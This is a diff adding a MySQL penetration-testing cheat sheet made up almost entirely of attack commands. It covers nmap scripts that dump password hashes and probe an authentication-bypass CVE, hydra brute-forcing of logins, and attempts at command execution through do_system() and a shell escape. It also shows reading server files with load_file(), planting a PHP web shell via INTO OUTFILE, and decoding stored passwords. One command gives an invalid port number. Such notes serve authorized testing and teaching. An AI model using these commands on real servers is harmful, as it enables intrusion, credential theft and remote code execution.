@@ -1,1 +1,42 @@
+nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
 
+Brute force
+hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
+
+Connect
+# Local
+mysql -u <USER>
+mysql -u <USER> -p
+
+# Remote
+mysql -h <IP> -u <USER>
+
+MySQL commands
+show databases;
+use <DATABASE>;
+show tables;
+describe <TABLE>;
+select * from <TABLE>;
+
+# Try to execute code
+select do_system('id');
+\! sh
+
+# Read & Write
+select load_file('<FILE>');
+select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
+
+
+mysql client commands
+    > mysql -h 10.11.1.111 -u root -p
+    > mysql -h 10.11.1.111 --port 330006 -u root -p
+    > show databases;
+    > use users;
+    > SHOW TABLES;
+        > select * from TABLE;
+        or to view a table that is too big
+        > select * from TABLE\G
+    > CREATE TABLE <table name> (id VARCHAR(20), firstname VARCHAR(20), lastname VARCHAR(20), username VARCHAR(8), email VARCHAR(35), password VARCHAR(25));
+    > INSERT into <table name> (id, firstname, lastname, username, email, password) VALUES (‘1’, ‘Yeah’, ‘Hub’, ‘yeahhub’, ‘yeahhub@gmail.com’, ‘123456’);
+    - Convert base64 passwords ("username" is the users column in the table, "password" password column "users" is the table)
+        > SELECT username, CONVERT(FROM_BASE64(FROM_BASE64(password)),CHAR) FROM users;
